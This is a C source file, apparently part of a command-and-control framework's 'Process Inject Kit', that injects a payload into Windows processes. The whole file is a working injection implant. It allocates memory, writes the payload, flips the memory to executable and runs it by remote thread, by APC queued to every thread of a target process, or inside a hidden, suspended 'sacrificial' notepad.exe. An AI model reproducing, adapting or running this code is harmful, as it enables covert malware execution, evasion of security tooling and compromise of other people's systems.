// default_inject.c -- Co2H Process Inject Kit: default NtCreateThreadEx inject.
//
// Reference implementation: allocate RW, write, protect RX, create thread.
// Handles all three method hints:
//   THREAD: inject into target_process (already opened by beacon)
//   APC:    queue APC to all threads of target_pid
//   SPAWN:  create sacrificial process suspended, inject, create thread
//
// This is functionally equivalent to the built-in beacon inject code.
// Compile with build_all.bat to produce inject.bin.

#include "process_inject_api.h"

// Forward declarations -- helpers MUST be defined AFTER entry point
// so that process_inject_entry is at offset 0 of .text (PIC requirement).
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp);
static uint32_t do_thread(InjectCtx* ctx);
static uint32_t do_apc(InjectCtx* ctx);
static uint32_t do_spawn(InjectCtx* ctx);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    switch (ctx->method_hint) {
    case INJECT_METHOD_APC:
        return do_apc(ctx);
    case INJECT_METHOD_SPAWN:
        return do_spawn(ctx);
    case INJECT_METHOD_THREAD:
    default:
        return do_thread(ctx);
    }
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

// Allocate RW in remote process, write payload, flip to RX.
// Returns remote base or NULL on failure.
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp) {
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;

    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        hp, &base, 0, &sz, 0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
    if (ns < 0 || !base) return NULL;

    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);
    if (ns < 0 || written != (SIZE_T)ctx->payload_len) return NULL;

    PVOID prot_base = base;
    SIZE_T prot_sz = (SIZE_T)ctx->payload_len;
    ULONG old_prot = 0;
    ctx->NtProtectVirtualMemory(hp, &prot_base, &prot_sz, 0x20 /* PAGE_EXECUTE_READ */, &old_prot);

    return base;
}

// INJECT_METHOD_THREAD: inject into pre-opened target_process.
static uint32_t do_thread(InjectCtx* ctx) {
    if (!ctx->target_process) return INJECT_ERR_PROCESS;

    void* rsc = alloc_write_protect(ctx, ctx->target_process);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF /* THREAD_ALL_ACCESS */, NULL,
        ctx->target_process, rsc, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;

    ctx->out_thread = hth;
    return INJECT_OK;
}

// INJECT_METHOD_APC: queue APC to all threads of target_pid.
static uint32_t do_apc(InjectCtx* ctx) {
    if (!ctx->target_process) return INJECT_ERR_PROCESS;

    void* rsc = alloc_write_protect(ctx, ctx->target_process);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    // Snapshot threads.
    HANDLE snap = ctx->CreateToolhelp32Snapshot(0x00000004 /* TH32CS_SNAPTHREAD */, 0);
    if (!snap || snap == (HANDLE)(LONG_PTR)-1) return INJECT_ERR_THREAD;

    // THREADENTRY32 (28 bytes on x86, 28 on x64 with packing)
    // We define it inline for PIC.
    typedef struct {
        DWORD dwSize;
        DWORD cntUsage;
        DWORD th32ThreadID;
        DWORD th32OwnerProcessID;
        LONG  tpBasePri;
        LONG  tpDeltaPri;
        DWORD dwFlags;
    } TE32;

    TE32 te;
    te.dwSize = sizeof(te);

    int queued = 0;
    if (ctx->Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != ctx->target_pid) continue;
            HANDLE hth = ctx->OpenThread(0x0010 /* THREAD_SET_CONTEXT */, FALSE, te.th32ThreadID);
            if (!hth) continue;
            if (ctx->NtQueueApcThread(hth, rsc, NULL, NULL, NULL) >= 0)
                ++queued;
            ctx->CloseHandle(hth);
        } while (ctx->Thread32Next(snap, &te));
    }
    ctx->CloseHandle(snap);

    return queued > 0 ? INJECT_OK : INJECT_ERR_THREAD;
}

// INJECT_METHOD_SPAWN: create sacrificial process + inject.
static uint32_t do_spawn(InjectCtx* ctx) {
    // Default spawn target if none specified.
    uint16_t default_spawn[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'n','o','t','e','p','a','d','.','e','x','e',0
    };

    uint16_t* cmd = (uint16_t*)ctx->spawn_to;
    if (!cmd || !cmd[0]) cmd = default_spawn;

    // STARTUPINFOW (68 bytes x86, 104 bytes x64)
    typedef struct {
        DWORD  cb;
        void*  lpReserved;
        void*  lpDesktop;
        void*  lpTitle;
        DWORD  dwX;
        DWORD  dwY;
        DWORD  dwXSize;
        DWORD  dwYSize;
        DWORD  dwXCountChars;
        DWORD  dwYCountChars;
        DWORD  dwFillAttribute;
        DWORD  dwFlags;
        WORD   wShowWindow;
        WORD   cbReserved2;
        void*  lpReserved2;
        HANDLE hStdInput;
        HANDLE hStdOutput;
        HANDLE hStdError;
    } SIW;

    typedef struct {
        HANDLE hProcess;
        HANDLE hThread;
        DWORD  dwProcessId;
        DWORD  dwThreadId;
    } PIW;

    SIW si;
    for (uint32_t i = 0; i < sizeof(si); ++i) ((volatile uint8_t*)&si)[i] = 0;
    si.cb = sizeof(si);
    si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
    si.wShowWindow = 0;      // SW_HIDE

    PIW pi;
    for (uint32_t i = 0; i < sizeof(pi); ++i) ((volatile uint8_t*)&pi)[i] = 0;

    // CREATE_SUSPENDED | CREATE_NO_WINDOW
    BOOL ok = ctx->CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                                  0x00000004 | 0x08000000,
                                  NULL, NULL, &si, &pi);
    if (!ok) return INJECT_ERR_PROCESS;

    void* rsc = alloc_write_protect(ctx, pi.hProcess);
    if (!rsc) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return INJECT_ERR_ALLOC;
    }
    ctx->out_remote_base = rsc;

    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, pi.hProcess, rsc, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return INJECT_ERR_THREAD;
    }

    ctx->out_thread  = hth;
    ctx->out_process = pi.hProcess;
    // Main thread stays suspended -- sacrificial process.
    ctx->CloseHandle(pi.hThread);
    return INJECT_OK;
}
